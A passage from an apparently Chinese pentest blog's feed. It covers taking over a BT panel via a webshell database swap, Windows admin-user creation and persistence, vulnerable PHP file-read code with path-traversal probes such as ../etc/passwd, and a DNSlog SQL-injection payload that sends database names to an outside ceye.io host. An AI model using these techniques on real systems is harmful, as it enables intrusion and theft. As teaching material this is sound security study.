href="#下载查看宝塔数据库文件" class="headerlink" title="下载查看宝塔数据库文件"></a>下载查看宝塔数据库文件</h2><p>默认位置：<code>C:/BtSoft/panel/data</code><br><img src="https://qiniu.hzktester.top/tp2020112506.png" alt="image.png"><br>找到<code>users</code>表的值。密码采用了<code>MD5</code>加密<br><img src="https://qiniu.hzktester.top/tp2020112507.png" alt="image.png"><br>这里我用<code>123456</code>的<code>MD5</code>密文：<br><img src="https://qiniu.hzktester.top/tp2020112508.png" alt="image.png"><br>修改后，注意将新建的用户id改为1：<br><img src="https://qiniu.hzktester.top/tp2020112509.png" alt="image.png"><br>使用大马覆盖掉原本的<code>default.db</code>文件<br><img src="https://qiniu.hzktester.top/tp2020112510.png" alt="image.png"><br>使用<code>test</code>，<code>123456</code>登录成功<br><img src="https://qiniu.hzktester.top/tp2020112511.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020112512.png" alt="image.png"><br>之后把<code>default.db</code>文件改回原来的重新覆盖即可</p><h1 id="getshell之后寻找mysql密码"><a href="#getshell之后寻找mysql密码" class="headerlink" title="getshell之后寻找mysql密码"></a>getshell之后寻找mysql密码</h1><h2 id="安装dedecms"><a href="#安装dedecms" class="headerlink" title="安装dedecms"></a>安装dedecms</h2><p><img src="https://qiniu.hzktester.top/tp2020112513.png" alt="image.png"><br>利用大马找到密码：<br><img src="https://qiniu.hzktester.top/tp2020112514.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;windwos用户-用户组&quot;&gt;&lt;a href=&quot;#windwos用户-用户组&quot; class=&quot;headerlink&quot; title=&quot;windwos用户/用户组&quot;&gt;&lt;/a&gt;windwos用户/用户组&lt;/h1&gt;&lt;h2 id=&quot;net-user：用户操作&quot;&gt;&lt;a href=&quot;#net-user：用户操作&quot; class=&quot;headerlink&quot; title=&quot;net user：用户操作&quot;&gt;&lt;/a&gt;net user：用户操作&lt;/h2&gt;&lt;p&gt;以下以操作用户名&lt;code&gt;test&lt;/code&gt;为例&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;net user test 密码 /add&lt;/code&gt;：添加用户&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net user test 密码&lt;/code&gt;：修改用户名密码&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net user test&lt;/code&gt;：查看&lt;code&gt;test&lt;/code&gt;用户详情&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net user test /active:yes&lt;/code&gt;：激活&lt;code&gt;test&lt;/code&gt;用户&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net user test /active:no&lt;/code&gt;：禁用&lt;code&gt;test&lt;/code&gt;用户&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;net-localgroup：用户组操作&quot;&gt;&lt;a href=&quot;#net-localgroup：用户组操作&quot; class=&quot;headerlink&quot; title=&quot;net localgroup：用户组操作&quot;&gt;&lt;/a&gt;net localgroup：用户组操作&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;net localgroup Administrators&lt;/code&gt;：查询&lt;code&gt;Administrators&lt;/code&gt;用户组成员&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net localgroup Administrators test /add&lt;/code&gt;：添加&lt;code&gt;test&lt;/code&gt;到&lt;code&gt;Administrators&lt;/code&gt;用户组&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net localgroup Administrators test /del&lt;/code&gt;：从&lt;code&gt;Administrators&lt;/code&gt;用户组删除&lt;code&gt;test&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;默认可写目录&quot;&gt;&lt;a href=&quot;#默认可写目录&quot; class=&quot;headerlink&quot; title=&quot;默认可写目录&quot;&gt;&lt;/a&gt;默认可写目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;windows：&lt;code&gt;C:/Windows/Temp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;linux：&lt;code&gt;/tmp&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;宝塔中间件降权&quot;&gt;&lt;a href=&quot;#宝塔中间件降权&quot; class=&quot;headerlink&quot; title=&quot;宝塔中间件降权&quot;&gt;&lt;/a&gt;宝塔中间件降权&lt;/h1&gt;&lt;h2 id=&quot;Apache使用www用户运行&quot;&gt;&lt;a href=&quot;#Apache使用www用户运行&quot; class=&quot;headerlink&quot; title=&quot;Apache使用www用户运行&quot;&gt;&lt;/a&gt;Apache使用www用户运行&lt;/h2&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="https://hzktester.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="https://hzktester.top/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>内网权限基础</title>
    <link href="https://hzktester.top/posts/50d3edd2.html"/>
    <id>https://hzktester.top/posts/50d3edd2.html</id>
    <published>2020-11-21T13:38:00.000Z</published>
    <updated>2020-11-25T09:28:24.448Z</updated>
    
    <content type="html"><![CDATA[<h1 id="权限划分"><a href="#权限划分" class="headerlink" title="权限划分"></a>权限划分</h1><h2 id="Windwos权限"><a href="#Windwos权限" class="headerlink" title="Windwos权限"></a>Windwos权限</h2><ul><li><code>SYSTEM</code>：系统权限</li><li><code>Administrator</code>：管理员权限</li><li><code>User</code>：普通用户权限</li></ul><h2 id="Linux权限"><a href="#Linux权限" class="headerlink" title="Linux权限"></a>Linux权限</h2><ul><li><code>root</code>：最高权限</li><li><code>user</code>：普通用户权限</li></ul><h2 id="shell权限"><a href="#shell权限" class="headerlink" title="shell权限"></a>shell权限</h2><p><code>shell</code>权限是由当前执行该服务（进程）的用户的权限决定的</p><h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h2 id="windows系统"><a href="#windows系统" class="headerlink" title="windows系统"></a>windows系统</h2><h3 id="启动项维持"><a href="#启动项维持" class="headerlink" title="启动项维持"></a>启动项维持</h3><ul><li>用户启动项：<code>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></li><li>公共启动项：<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code></li></ul><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="windwos系统"><a href="#windwos系统" class="headerlink" title="windwos系统"></a>windwos系统</h2><p>当拿到<code>getshell</code>之后，是<code>user</code>权限</p><ul><li>上传具有诱惑性的木马文件等管理员打开</li><li>数据库执行命令</li><li>上传phpinfo查看未被禁止的命令函数</li><li>查看容器是否可以解析其他脚本</li></ul><h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><ul><li>MYSQL</li><li>SQL server</li></ul><h1 id="拿到shell之后的操作"><a href="#拿到shell之后的操作" class="headerlink" title="拿到shell之后的操作"></a>拿到shell之后的操作</h1><p>查看操作系统、权限、是否可以执行命令、是否允许跨目录、容器</p><h2 id="查看是否可以执行命令："><a href="#查看是否可以执行命令：" class="headerlink" title="查看是否可以执行命令："></a>查看是否可以执行命令：</h2><ul><li><code>phpinfo()</code>：disable_functions</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;权限划分&quot;&gt;&lt;a href=&quot;#权限划分&quot; class=&quot;headerlink&quot; title=&quot;权限划分&quot;&gt;&lt;/a&gt;权限划分&lt;/h1&gt;&lt;h2 id=&quot;Windwos权限&quot;&gt;&lt;a href=&quot;#Windwos权限&quot; class=&quot;headerlink&quot; title=&quot;Windwos权限&quot;&gt;&lt;/a&gt;Windwos权限&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SYSTEM&lt;/code&gt;：系统权限&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Administrator&lt;/code&gt;：管理员权限&lt;/li&gt;
&lt;li&gt;&lt;code&gt;User&lt;/code&gt;：普通用户权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Linux权限&quot;&gt;&lt;a href=&quot;#Linux权限&quot; class=&quot;headerlink&quot; title=&quot;Linux权限&quot;&gt;&lt;/a&gt;Linux权限&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;root&lt;/code&gt;：最高权限&lt;/li&gt;
&lt;li&gt;&lt;code&gt;user&lt;/code&gt;：普通用户权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;shell权限&quot;&gt;&lt;a href=&quot;#shell权限&quot; class=&quot;headerlink&quot; title=&quot;shell权限&quot;&gt;&lt;/a&gt;shell权限&lt;/h2&gt;&lt;p&gt;&lt;code&gt;shell&lt;/code&gt;权限是由当前执行该服务（进程）的用户的权限决定的&lt;/p&gt;
&lt;h1 id=&quot;权限维持&quot;&gt;&lt;a href=&quot;#权限维持&quot; class=&quot;headerlink&quot; title=&quot;权限维持&quot;&gt;&lt;/a&gt;权限维持&lt;/h1&gt;&lt;h2 id=&quot;windows系统&quot;&gt;&lt;a href=&quot;#windows系统&quot; class=&quot;headerlink&quot; title=&quot;windows系统&quot;&gt;&lt;/a&gt;windows系统&lt;/h2&gt;&lt;h3 id=&quot;启动项维持&quot;&gt;&lt;a href=&quot;#启动项维持&quot; class=&quot;headerlink&quot; title=&quot;启动项维持&quot;&gt;&lt;/a&gt;启动项维持&lt;/h3&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="https://hzktester.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="https://hzktester.top/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>PHP-任意文件读取/下载漏洞</title>
    <link href="https://hzktester.top/posts/53895abe.html"/>
    <id>https://hzktester.top/posts/53895abe.html</id>
    <published>2020-11-20T12:32:00.000Z</published>
    <updated>2020-11-25T09:28:04.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="危害说明"><a href="#危害说明" class="headerlink" title="危害说明"></a>危害说明</h1><p>下载服务器任意文件，例如脚本代码、系统配置文件、等等可用的代码进行代码审计或是获取系统<code>ssh</code>进行登录、获取数据库账号密码进行连接等等</p><h1 id="任意文件读取-利用与代码"><a href="#任意文件读取-利用与代码" class="headerlink" title="任意文件读取-利用与代码"></a>任意文件读取-利用与代码</h1><h2 id="例子一：读取文件"><a href="#例子一：读取文件" class="headerlink" title="例子一：读取文件"></a>例子一：读取文件</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    readfile($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $fp = fopen($filename,<span class="string">&quot;r&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">    $data = fread($fp,filesize($filename));</span><br><span class="line">    fclose($fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $data;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>把以上三个文件分别上传到我自己的服务器：<br><img src="https://qiniu.hzktester.top/tp2020112012.png" alt="image.png"><br>分别访问三个测试代码读取<code>1.txt</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://test.hzktester.top/upload/read1.php?file=./1.txt</span><br><span class="line">curl http://test.hzktester.top/upload/read2.php?file=./1.txt</span><br><span class="line">curl http://test.hzktester.top/upload/read3.php?file=./1.txt</span><br></pre></td></tr></table></figure><p>我这里直接用<code>curl</code>命令访问进行测试<br><img src="https://qiniu.hzktester.top/tp2020112013.png" alt="tp2020112013.png"></p><h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><ul><li><code>readfile()</code>：读取文件并写入到输出缓冲。</li><li><code>fopen()</code>、<code>fread()</code>、<code>fclose()</code>：打开文件，输出文件，关闭文件。</li><li><code>file_get_contents()</code>：将整个文件读入一个字符串。<h2 id="例子二：复制文件"><a href="#例子二：复制文件" class="headerlink" title="例子二：复制文件"></a>例子二：复制文件</h2><h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    copy($filename, <span class="string">&#x27;xxx.txt&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h3>上传测试代码后，访问：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://test.hzktester.top/upload/read.php?file=./1.txt</span><br></pre></td></tr></table></figure>访问后，<code>copy()</code>函数会在同目录复制<code>1.txt</code>文件的内容为<code>xxx.txt</code>文件。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\86136&gt;curl http://test.hzktester.top/upload/xxx.txt</span><br><span class="line">我是被读取的文件</span><br></pre></td></tr></table></figure>然后打开刚刚复制的<code>xxx.txt</code>文件<h1 id="任意文件下载-利用与代码"><a href="#任意文件下载-利用与代码" class="headerlink" title="任意文件下载-利用与代码"></a>任意文件下载-利用与代码</h1><h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    header(<span class="string">&quot;Content-type:application/octet-stream&quot;</span>);</span><br><span class="line">    header(<span class="string">&quot;Content-Disposition:attachment;filename=&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">    header(<span class="string">&quot;Accept-ranges:bytes&quot;</span>);</span><br><span class="line">    header(<span class="string">&quot;Accept-length:&quot;</span>.filesize(<span class="variable">$filename</span>));</span><br><span class="line">    readfile(<span class="variable">$filename</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2>还是先把测试代码上传到服务器，名字为<code>upload.php</code>。下载<code>1.txt</code>文件<br><img src="https://qiniu.hzktester.top/tp2020112014.png" alt="tp2020112014.png"><h1 id="漏洞挖掘思路："><a href="#漏洞挖掘思路：" class="headerlink" title="漏洞挖掘思路："></a>漏洞挖掘思路：</h1>多多关注一些参数如下:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">download.php?path=./../etc/passwd</span><br><span class="line"></span><br><span class="line">download.php?Path=</span><br><span class="line">download.php?path=</span><br><span class="line">download.php?RealPath=</span><br><span class="line">download.php?FilePath=</span><br><span class="line">download.php?ﬁlepath=</span><br><span class="line">download.php?inputFile=</span><br><span class="line">download.php?url=</span><br><span class="line">download.php?urls=</span><br><span class="line">download.php?dir=</span><br><span class="line">download.php?data=</span><br><span class="line">download.php?<span class="built_in">read</span>ﬁle=</span><br><span class="line">download.php?src=</span><br><span class="line"></span><br><span class="line">等等....</span><br></pre></td></tr></table></figure><h1 id="危险函数-1"><a href="#危险函数-1" class="headerlink" title="危险函数"></a>危险函数</h1>代码审计直接搜这些函数看有没有过滤不严谨<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2></li><li><code>readfile()</code>：读取文件并写入到输出缓冲。</li><li><code>fopen()</code>、<code>fread()</code>、<code>fclose()</code>：打开文件，输出文件，关闭文件。</li><li><code>file_get_contents()</code>：将整个文件读入一个字符串。</li></ul><h2 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h2><ul><li><code>copy()</code>：拷贝文件。</li></ul><h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><ul><li><code>head()</code>函数中的<code>Content-Disposition</code>：强制浏览器下载文件。</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;危害说明&quot;&gt;&lt;a href=&quot;#危害说明&quot; class=&quot;headerlink&quot; title=&quot;危害说明&quot;&gt;&lt;/a&gt;危害说明&lt;/h1&gt;&lt;p&gt;下载服务器任意文件，例如脚本代码、系统配置文件、等等可用的代码进行代码审计或是获取系统&lt;code&gt;ssh&lt;/code&gt;进行登录、获取数据库账号密码进行连接等等&lt;/p&gt;
&lt;h1 id=&quot;任意文件读取-利用与代码&quot;&gt;&lt;a href=&quot;#任意文件读取-利用与代码&quot; class=&quot;headerlink&quot; title=&quot;任意文件读取-利用与代码&quot;&gt;&lt;/a&gt;任意文件读取-利用与代码&lt;/h1&gt;&lt;h2 id=&quot;例子一：读取文件&quot;&gt;&lt;a href=&quot;#例子一：读取文件&quot; class=&quot;headerlink&quot; title=&quot;例子一：读取文件&quot;&gt;&lt;/a&gt;例子一：读取文件&lt;/h2&gt;&lt;h3 id=&quot;代码&quot;&gt;&lt;a href=&quot;#代码&quot; class=&quot;headerlink&quot; title=&quot;代码&quot;&gt;&lt;/a&gt;代码&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $filename = $_GET[&lt;span class=&quot;string&quot;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    readfile($filename);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $filename = $_GET[&lt;span class=&quot;string&quot;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $fp = fopen($filename,&lt;span class=&quot;string&quot;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;Unable to open file!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $data = fread($fp,filesize($filename));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    fclose($fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; $data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $filename = $_GET[&lt;span class=&quot;string&quot;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; file_get_contents($filename);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;利用&quot;&gt;&lt;a href=&quot;#利用&quot; class=&quot;headerlink&quot; title=&quot;利用&quot;&gt;&lt;/a&gt;利用&lt;/h3&gt;&lt;p&gt;把以上三个文件分别上传到我自己的服务器：&lt;br&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112012.png&quot; alt=&quot;image.png&quot;&gt;&lt;br&gt;分别访问三个测试代码读取&lt;code&gt;1.txt&lt;/code&gt;文件&lt;/p&gt;</summary>
    
    
    
    <category term="Web渗透" scheme="https://hzktester.top/categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="任意文件读取下载" scheme="https://hzktester.top/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8B%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>巧用DNSlog实现无回显注入</title>
    <link href="https://hzktester.top/posts/b6cdb199.html"/>
    <id>https://hzktester.top/posts/b6cdb199.html</id>
    <published>2020-11-20T03:42:00.000Z</published>
    <updated>2020-11-20T03:45:51.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DNSlog回显原理"><a href="#DNSlog回显原理" class="headerlink" title="DNSlog回显原理"></a>DNSlog回显原理</h1><p>首先需要有一个可以配置的域名，比如：<code>ceye.io</code>，然后通过代理商设置域名 <code>ceye.io</code> 的 <code>nameserver</code> 为自己的服务器 A，然后再服务器 A 上配置好 <code>DNS Server</code>，这样以来所有 <code>ceye.io</code> 及其子域名的查询都会到服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下。<br><img src="https://qiniu.hzktester.top/tp2020112001.png" alt="tp2020112001.png"></p><blockquote><p>DNS在解析的时候会留下日志，这个就是读取多级域名的解析日志，来获取信息<br>简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</p></blockquote><h1 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h1><p>在<code>sql</code>注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被<code>waf</code>拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，这时候就要用到我们的<code>DNSlog</code>注入。</p><h1 id="推荐平台"><a href="#推荐平台" class="headerlink" title="推荐平台"></a>推荐平台</h1><ul><li><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></li><li><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a></li><li><a href="http://ceye.io/">http://ceye.io</a></li></ul><p>以下利用，我这里使用<code>ceye</code>平台演示。<br><img src="https://qiniu.hzktester.top/tp2020112002.png" alt="image.png"><br>他会给你一个三级域名，你把信息写在第四级域名上就好了，比如我这里访问hzktester.xxxx.cece.io ，访问之后就会有查询记录。<br><img src="https://qiniu.hzktester.top/tp2020112003.png" alt="tp2020112003.png"><br><img src="https://qiniu.hzktester.top/tp2020112004.png" alt="image.png"></p><h2 id="利用一：SQL注入"><a href="#利用一：SQL注入" class="headerlink" title="利用一：SQL注入"></a>利用一：SQL注入</h2><h3 id="利用场景："><a href="#利用场景：" class="headerlink" title="利用场景："></a>利用场景：</h3><p>不论是<code>bool</code>型盲注还是时间型盲注，都需要频繁的跑请求才能够获取数据库中的值，在现代<code>WAF</code>的防护下，很可能导致IP被<code>ban</code>。</p><p>这个时候我们可以结合<code>DNSLOG</code>完美快速的将数据取出。如遇到<code>MySql</code>的盲注时，可以利用内置函数<code>load_file()</code>来完成<code>DNSLOG</code>。<code>load_file()</code>不仅能够加载本地文件，同时也能对诸如\<a href="http://www.test.com/">www.test.com</a>这样的<code>URL</code>发起请求。</p><h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><p><code>load_file()</code>需要设置<code>secure_file_priv</code>的值，可以参考这篇文章，这里就不赘述了。<a href="https://hzktester.top/posts/d83e4025.html">链接</a></p><h3 id="sql-labs靶场复现"><a href="#sql-labs靶场复现" class="headerlink" title="sql-labs靶场复现"></a>sql-labs靶场复现</h3><p>在<code>mysql</code>命令行执行：<code>select load_file(&#39;\\\\afanti.xxxx.ceye.io\\aaa&#39;);</code>其中<code>afanti</code>就是要注入的查询语句</p><p><code>payload</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxxxx.ceye.io\\aaa&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112005.png" alt="tp2020112005.png"><br>查看平台，<code>dnsLog</code>被记录下来。<br><img src="https://qiniu.hzktester.top/tp2020112006.png" alt="image.png"><br>ps：稍微解释一下这个语句，这里使用<code>concat</code>函数将<code>(select database())</code>得到的内容作为查询<code>url</code>的一部分，和我们的平台三级域名拼接组合成一个四级域名，而<code>load_file</code>函数会通过<code>dns</code>解析请求，所以我们在<code>dnslog</code>平台就可以看到查询的记录(<strong>包含着我们注入出的数据</strong>)</p><p>对于表段，由于<code>load_file()</code>一次只能传输一条数据，所以查询的时候需要使用<code>limit</code>来一个一个的解析。</p><h2 id="利用二：XSS盲打"><a href="#利用二：XSS盲打" class="headerlink" title="利用二：XSS盲打"></a>利用二：XSS盲打</h2><h3 id="利用场景-1"><a href="#利用场景-1" class="headerlink" 